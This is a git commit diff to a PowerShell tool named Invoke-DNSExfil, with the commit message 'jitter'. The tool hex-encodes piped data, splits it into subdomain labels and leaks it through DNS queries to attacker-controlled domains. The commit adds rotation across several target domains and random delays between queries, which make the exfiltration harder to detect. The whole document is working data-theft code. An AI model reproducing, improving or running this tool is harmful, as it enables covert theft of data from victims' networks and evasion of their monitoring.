b034ac2925677ba3b19922d340e3b7e7747258f1
Paweł Maziarz <pawel.maziarz@pmlabs.net>
2020-04-15 07:27:20 +0200

    jitter

--- exfil/Invoke-DNSExfil.ps1
+++ exfil/Invoke-DNSExfil.ps1
@@ -4,7 +4,7 @@ Function Invoke-DNSExfil {
         [Parameter(ValueFromPipeline = $true)]
         [String]$Payload,
         [Parameter(Mandatory = $true, Position = 0)]
-        [String]$Target,
+        [String[]]$Target,
         [Parameter()]
         [Int]$DomainLength = 120,
         [Parameter()]
@@ -12,20 +12,26 @@ Function Invoke-DNSExfil {
         [Parameter()]
         [String]$Server = "",
         [Parameter()]
-        [Int]$Base=0
+        [Int]$Base=0,
+        [Parameter()]
+        [Int]$DelayMin=0,
+        [Parameter()]
+        [Int]$DelayMax=0
+
     )
 
     Begin {
         filter thx { ($_.ToCharArray() | % { "{0:X2}" -f [int]$_ }) -join "" }
         filter chunks($c) { $t = $_; 0..[math]::floor($t.length / $c) | % { $t.substring($c * $_, [math]::min($c, $t.length - $c * $_)) } } 
         filter dots($c) { ($_ -replace "([\w]{$c})", "`$1.").trim('.') } 
+        $script:base = $Base
 
         function dnsquery($domain) {
             if ($Server -eq "") {
-                Resolve-DnsName -type a "$domain.$((++$Base)).$Target" 
+                Resolve-DnsName -type a "$domain.$((++$script:base)).$($Target|Get-Random)"
             }
             else {
-                Resolve-DnsName -Server $Server -type a "$domain.$((++$Base)).$Target" 
+                Resolve-DnsName -Server $Server -type a "$domain.$((++$script:base)).$($Target|Get-Random)"
             }
         }
 
@@ -34,6 +40,9 @@ Function Invoke-DNSExfil {
 
     Process {
         $Payload | out-string | thx | chunks $DomainLength | dots $SubdomainLength | % {
+            if ($DelayMin -lt $DelayMax) {
+                Start-Sleep -Milliseconds (Get-Random -Minimum $DelayMin -Maximum $DelayMax)
+            }
             dnsquery $_
         }
     }
